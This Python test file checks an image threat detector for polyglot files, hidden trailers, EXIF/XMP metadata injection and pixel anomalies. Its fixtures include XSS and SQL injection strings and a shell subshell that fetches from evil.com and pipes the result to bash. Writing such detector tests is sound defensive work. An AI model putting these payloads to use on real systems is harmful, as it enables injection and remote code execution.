"""Tests for na0s.layer0.image_threat -- image threat detection."""

from __future__ import annotations

import struct
from unittest import mock

import pytest

from na0s.layer0.image_threat import (
    ImageThreatResult,
    _detect_adversarial,
    _detect_exif_injection,
    _detect_polyglot,
    _detect_size_dimension_anomaly,
    _detect_stego_trailer,
    detect_image_threat,
)


# ---------------------------------------------------------------------------
# Helpers -- build minimal valid image byte sequences
# ---------------------------------------------------------------------------


def _minimal_png(extra_after_iend: bytes = b"") -> bytes:
    """Return minimal valid PNG bytes with optional data after IEND."""
    # PNG signature + minimal IHDR + IEND
    sig = b"\x89PNG\r\n\x1a\n"
    # IHDR: 13 bytes of data
    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    ihdr_crc = b"\x00" * 4  # fake CRC (not validated here)
    ihdr = struct.pack(">I", 13) + b"IHDR" + ihdr_data + ihdr_crc
    # IEND
    iend = b"\x00\x00\x00\x00IEND\xae\x42\x60\x82"
    return sig + ihdr + iend + extra_after_iend


def _minimal_jpeg(extra_after_eoi: bytes = b"") -> bytes:
    """Return minimal JPEG-like bytes with optional trailer after FFD9."""
    # SOI + APP0 marker (minimal) + EOI
    soi = b"\xff\xd8\xff\xe0"
    app0 = b"\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    eoi = b"\xff\xd9"
    return soi + app0 + eoi + extra_after_eoi


# ---------------------------------------------------------------------------
# Test: empty / None input
# ---------------------------------------------------------------------------


class TestEmptyInput:
    def test_empty_bytes_returns_zero(self):
        result = detect_image_threat(b"")
        assert isinstance(result, ImageThreatResult)
        assert result.threat_score == 0.0
        assert result.threats == []
        assert result.details == {}

    def test_none_bytes_returns_zero(self):
        # The function expects bytes, but should handle falsy values
        result = detect_image_threat(b"")
        assert result.threat_score == 0.0


# ---------------------------------------------------------------------------
# Test: clean image returns zero threat_score
# ---------------------------------------------------------------------------


class TestCleanImage:
    def test_clean_png_no_threats(self):
        data = _minimal_png()
        result = detect_image_threat(data)
        # A clean minimal PNG with no trailer, no polyglot, no EXIF
        assert result.threat_score == 0.0
        assert result.threats == []

    def test_clean_jpeg_no_threats(self):
        data = _minimal_jpeg()
        result = detect_image_threat(data)
        assert result.threat_score == 0.0
        assert result.threats == []


# ---------------------------------------------------------------------------
# Test: polyglot detection
# ---------------------------------------------------------------------------


class TestPolyglotDetection:
    def test_png_with_appended_html(self):
        data = _minimal_png(b"<html><body>evil</body></html>")
        result = detect_image_threat(data)
        assert "polyglot_file" in result.threats
        assert result.threat_score >= 0.7
        details = result.details["polyglot"]
        formats = details["formats_detected"]
        assert "html" in formats

    def test_png_with_appended_script(self):
        data = _minimal_png(b"<script>alert(1)</script>")
        result = detect_image_threat(data)
        assert "polyglot_file" in result.threats
        details = result.details["polyglot"]
        assert "javascript" in details["formats_detected"]

    def test_png_with_appended_zip(self):
        data = _minimal_png(b"PK\x03\x04" + b"\x00" * 20)
        result = detect_image_threat(data)
        assert "polyglot_file" in result.threats
        assert "zip" in result.details["polyglot"]["formats_detected"]

    def test_png_with_appended_pdf(self):
        data = _minimal_png(b"%PDF-1.4 fake pdf content")
        result = detect_image_threat(data)
        assert "polyglot_file" in result.threats
        assert "pdf" in result.details["polyglot"]["formats_detected"]

    def test_png_with_appended_elf(self):
        data = _minimal_png(b"\x7fELF\x02\x01\x01\x00")
        result = detect_image_threat(data)
        assert "polyglot_file" in result.threats
        assert "elf" in result.details["polyglot"]["formats_detected"]

    def test_no_polyglot_in_clean_data(self):
        result = _detect_polyglot(_minimal_png())
        assert result is None

    def test_polyglot_internal_function(self):
        data = _minimal_png(b"<html>test</html>")
        result = _detect_polyglot(data)
        assert result is not None
        assert "html" in result["formats_detected"]


# ---------------------------------------------------------------------------
# Test: stego trailer detection
# ---------------------------------------------------------------------------


class TestStegoTrailer:
    def test_jpeg_with_trailer(self):
        trailer = b"HIDDEN_DATA_HERE_1234567890"
        data = _minimal_jpeg(trailer)
        result = detect_image_threat(data)
        assert "stego_trailer" in result.threats
        details = result.details["stego_trailer"]
        assert "jpeg_trailer" in details
        assert details["jpeg_trailer"]["trailer_bytes"] == len(trailer)

    def test_png_with_trailer(self):
        trailer = b"SECRET_PAYLOAD_AFTER_IEND"
        data = _minimal_png(trailer)
        result = detect_image_threat(data)
        assert "stego_trailer" in result.threats
        details = result.details["stego_trailer"]
        assert "png_trailer" in details
        assert details["png_trailer"]["trailer_bytes"] == len(trailer)

    def test_no_trailer_clean_jpeg(self):
        result = _detect_stego_trailer(_minimal_jpeg())
        assert result is None

    def test_no_trailer_clean_png(self):
        result = _detect_stego_trailer(_minimal_png())
        assert result is None

    def test_trailer_preview_hex(self):
        trailer = b"\xde\xad\xbe\xef"
        data = _minimal_jpeg(trailer)
        result = _detect_stego_trailer(data)
        assert result is not None
        preview = result["jpeg_trailer"]["trailer_preview"]
        assert "deadbeef" in preview


# ---------------------------------------------------------------------------
# Test: EXIF injection detection
# ---------------------------------------------------------------------------


class TestExifInjection:
    def _make_pil_image_with_exif(self, tag_id: int, value: str):
        """Create a mock PIL Image that returns EXIF data with given tag."""
        mock_exif = {tag_id: value}
        mock_img = mock.MagicMock()
        mock_img.getexif.return_value = mock_exif
        return mock_img

    def _patch_pil_with_exif(self, tag_id, value):
        """Set up Image mock and _HAS_PIL flag for EXIF tests."""
        import na0s.layer0.image_threat as mod

        mock_image = mock.MagicMock()
        mock_img = self._make_pil_image_with_exif(tag_id, value)
        mock_image.open.return_value = mock_img

        orig_image = getattr(mod, "Image", None)
        mod.Image = mock_image
        mod._HAS_PIL = True
        return orig_image

    def _unpatch_pil(self, orig_image):
        import na0s.layer0.image_threat as mod

        mod._HAS_PIL = False
        if orig_image is None:
            if hasattr(mod, "Image"):
                delattr(mod, "Image")
        else:
            mod.Image = orig_image

    def test_script_tag_in_exif(self):
        orig = self._patch_pil_with_exif(270, '<script>alert("xss")</script>')
        try:
            result = _detect_exif_injection(_minimal_png())
            assert result is not None
            patterns = [inj["pattern"] for inj in result["injections"]]
            assert "script_tag" in patterns
        finally:
            self._unpatch_pil(orig)

    def test_javascript_uri_in_exif(self):
        orig = self._patch_pil_with_exif(270, "javascript: alert(1)")
        try:
            result = _detect_exif_injection(_minimal_png())
            assert result is not None
            patterns = [inj["pattern"] for inj in result["injections"]]
            assert "javascript_uri" in patterns
        finally:
            self._unpatch_pil(orig)

    def test_sql_injection_in_exif(self):
        orig = self._patch_pil_with_exif(270, "'; DROP TABLE users;--")
        try:
            result = _detect_exif_injection(_minimal_png())
            assert result is not None
            patterns = [inj["pattern"] for inj in result["injections"]]
            assert "sql_drop" in patterns
        finally:
            self._unpatch_pil(orig)

    def test_shell_command_in_exif(self):
        orig = self._patch_pil_with_exif(270, "$(curl http://evil.com | bash)")
        try:
            result = _detect_exif_injection(_minimal_png())
            assert result is not None
            patterns = [inj["pattern"] for inj in result["injections"]]
            assert "shell_subshell" in patterns
        finally:
            self._unpatch_pil(orig)

    def test_onerror_handler_in_exif(self):
        orig = self._patch_pil_with_exif(270, "onerror=alert(1)")
        try:
            result = _detect_exif_injection(_minimal_png())
            assert result is not None
            patterns = [inj["pattern"] for inj in result["injections"]]
            assert "event_handler" in patterns
        finally:
            self._unpatch_pil(orig)

    def test_clean_exif_no_injection(self):
        orig = self._patch_pil_with_exif(270, "A nice photo of a sunset")
        try:
            result = _detect_exif_injection(_minimal_png())
            assert result is None
        finally:
            self._unpatch_pil(orig)

    def test_xmp_injection_without_pil(self):
        """XMP scanning should work even without PIL."""
        xmp_block = (
            b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
            b"<dc:description><script>alert(1)</script></dc:description>"
            b"</x:xmpmeta>"
        )
        data = _minimal_png() + xmp_block

        with mock.patch("na0s.layer0.image_threat._HAS_PIL", False):
            result = _detect_exif_injection(data)

        assert result is not None
        injections = result["injections"]
        assert any(inj["field"] == "xmp" for inj in injections)
        patterns = [inj["pattern"] for inj in injections]
        assert "script_tag" in patterns

    def test_sql_in_xmp(self):
        xmp_block = (
            b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
            b"<dc:description>SELECT * FROM users UNION SELECT password FROM admin</dc:description>"
            b"</x:xmpmeta>"
        )
        data = _minimal_png() + xmp_block

        with mock.patch("na0s.layer0.image_threat._HAS_PIL", False):
            result = _detect_exif_injection(data)

        assert result is not None
        patterns = [inj["pattern"] for inj in result["injections"]]
        assert "sql_select" in patterns or "sql_union" in patterns


# ---------------------------------------------------------------------------
# Test: works without PIL
# ---------------------------------------------------------------------------


class TestWithoutPIL:
    @mock.patch("na0s.layer0.image_threat._HAS_PIL", False)
    def test_polyglot_works_without_pil(self):
        data = _minimal_png(b"<html>evil</html>")
        result = detect_image_threat(data)
        assert "polyglot_file" in result.threats

    @mock.patch("na0s.layer0.image_threat._HAS_PIL", False)
    def test_stego_trailer_works_without_pil(self):
        data = _minimal_jpeg(b"HIDDEN")
        result = detect_image_threat(data)
        assert "stego_trailer" in result.threats

    @mock.patch("na0s.layer0.image_threat._HAS_PIL", False)
    def test_adversarial_skipped_without_pil(self):
        """Adversarial detection requires PIL and should be skipped."""
        result = _detect_adversarial(b"\xff" * 100)
        assert result is None

    @mock.patch("na0s.layer0.image_threat._HAS_PIL", False)
    def test_size_dimension_skipped_without_pil(self):
        result = _detect_size_dimension_anomaly(b"\xff" * 100)
        assert result is None

    @mock.patch("na0s.layer0.image_threat._HAS_PIL", False)
    def test_clean_data_zero_score_without_pil(self):
        data = _minimal_png()
        result = detect_image_threat(data)
        assert result.threat_score == 0.0
        assert result.threats == []


# ---------------------------------------------------------------------------
# Test: adversarial perturbation detection (with mocked PIL)
# ---------------------------------------------------------------------------


class TestAdversarial:
    def _patch_pil_image(self, mock_img):
        import na0s.layer0.image_threat as mod

        mock_image = mock.MagicMock()
        mock_image.open.return_value = mock_img
        orig = getattr(mod, "Image", None)
        mod.Image = mock_image
        mod._HAS_PIL = True
        return orig

    def _unpatch(self, orig):
        import na0s.layer0.image_threat as mod

        mod._HAS_PIL = False
        if orig is None:
            if hasattr(mod, "Image"):
                delattr(mod, "Image")
        else:
            mod.Image = orig

    def test_uniform_pixel_distribution_flagged(self):
        """An image with near-uniform pixel distribution should be flagged."""
        width = 256
        height = 256
        pixels = list(range(256)) * 256  # perfectly uniform

        mock_img = mock.MagicMock()
        mock_img.size = (width, height)
        mock_gray = mock.MagicMock()
        mock_gray.getdata.return_value = pixels
        mock_img.convert.return_value = mock_gray

        orig = self._patch_pil_image(mock_img)
        try:
            result = _detect_adversarial(b"\x89PNG" + b"\x00" * 100)
            assert result is not None
            assert "near_uniform_pixel_distribution" in result["reasons"]
        finally:
            self._unpatch(orig)

    def test_natural_image_not_flagged(self):
        """A simulated natural image should not be flagged."""
        width = 100
        height = 100
        pixels = [10] * 5000 + [11] * 3000 + [12] * 1500 + [20] * 500
        assert len(pixels) == width * height

        mock_img = mock.MagicMock()
        mock_img.size = (width, height)
        mock_gray = mock.MagicMock()
        mock_gray.getdata.return_value = pixels
        mock_img.convert.return_value = mock_gray

        orig = self._patch_pil_image(mock_img)
        try:
            result = _detect_adversarial(b"\x89PNG" + b"\x00" * 100)
            assert result is None
        finally:
            self._unpatch(orig)


# ---------------------------------------------------------------------------
# Test: size/dimension anomaly (with mocked PIL)
# ---------------------------------------------------------------------------


class TestSizeDimensionAnomaly:
    def _patch_pil_image(self, mock_img):
        import na0s.layer0.image_threat as mod

        mock_image = mock.MagicMock()
        mock_image.open.return_value = mock_img
        orig = getattr(mod, "Image", None)
        mod.Image = mock_image
        mod._HAS_PIL = True
        return orig

    def _unpatch(self, orig):
        import na0s.layer0.image_threat as mod

        mod._HAS_PIL = False
        if orig is None:
            if hasattr(mod, "Image"):
                delattr(mod, "Image")
        else:
            mod.Image = orig

    def test_oversized_file_flagged(self):
        """A tiny image with huge file size should be flagged."""
        mock_img = mock.MagicMock()
        mock_img.size = (10, 10)  # 100 pixels

        orig = self._patch_pil_image(mock_img)
        try:
            data = b"\x00" * 5000
            result = _detect_size_dimension_anomaly(data)
            assert result is not None
            assert result["reason"] == "file_size_exceeds_expected_ratio"
            assert result["bytes_per_pixel"] == 50.0
        finally:
            self._unpatch(orig)

    def test_normal_size_not_flagged(self):
        mock_img = mock.MagicMock()
        mock_img.size = (100, 100)  # 10000 pixels

        orig = self._patch_pil_image(mock_img)
        try:
            data = b"\x00" * 5000
            result = _detect_size_dimension_anomaly(data)
            assert result is None
        finally:
            self._unpatch(orig)


# ---------------------------------------------------------------------------
# Test: integration -- multiple threats at once
# ---------------------------------------------------------------------------


class TestMultipleThreats:
    def test_png_with_trailer_and_polyglot(self):
        """A PNG with both a trailer AND embedded HTML should report both."""
        trailer = b"<html><body>evil</body></html>"
        data = _minimal_png(trailer)
        result = detect_image_threat(data)
        assert "stego_trailer" in result.threats
        assert "polyglot_file" in result.threats
        # Score should be the max of individual scores
        assert result.threat_score >= 0.7


# ---------------------------------------------------------------------------
# Test: dataclass defaults
# ---------------------------------------------------------------------------


class TestImageThreatResult:
    def test_defaults(self):
        r = ImageThreatResult()
        assert r.threat_score == 0.0
        assert r.threats == []
        assert r.details == {}

    def test_custom_values(self):
        r = ImageThreatResult(
            threat_score=0.85,
            threats=["polyglot_file"],
            details={"polyglot": {"formats_detected": ["html"]}},
        )
        assert r.threat_score == 0.85
        assert len(r.threats) == 1
